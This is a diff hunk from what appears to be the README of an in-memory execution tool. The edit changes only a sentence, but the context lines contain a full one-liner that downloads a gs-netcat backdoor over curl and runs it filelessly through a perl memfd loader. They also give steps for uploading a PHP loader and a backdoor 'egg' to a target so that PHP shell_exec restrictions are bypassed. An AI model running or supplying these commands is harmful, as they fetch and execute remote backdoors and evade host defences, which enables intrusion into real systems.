@@ -32,7 +32,7 @@ The educated reader understands that this is mostly used to pipe a backdoor from
 curl -SsfL https://gsocket.io/bin/gs-netcat_mini-linux-x86_64 | GS_ARGS="-ilDq -s ChangeMe" perl '-efor(319,279){($f=syscall$_,$",1)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}X,@ARGV' -- "$@"
 ```
 
-The PHP variant circumvents [PHP's "shell_exec" restrictions](https://www.cyberciti.biz/faq/linux-unix-apache-lighttpd-phpini-disable-functions/).
+The PHP variant also circumvents ["shell_exec" restrictions](https://www.cyberciti.biz/faq/linux-unix-apache-lighttpd-phpini-disable-functions/).
 
 1. Upload `memexec.php` and `egg` (your backdoor) onto the target
 2. Call `curl -SsfL https://target/memexec.php` to execute `egg`
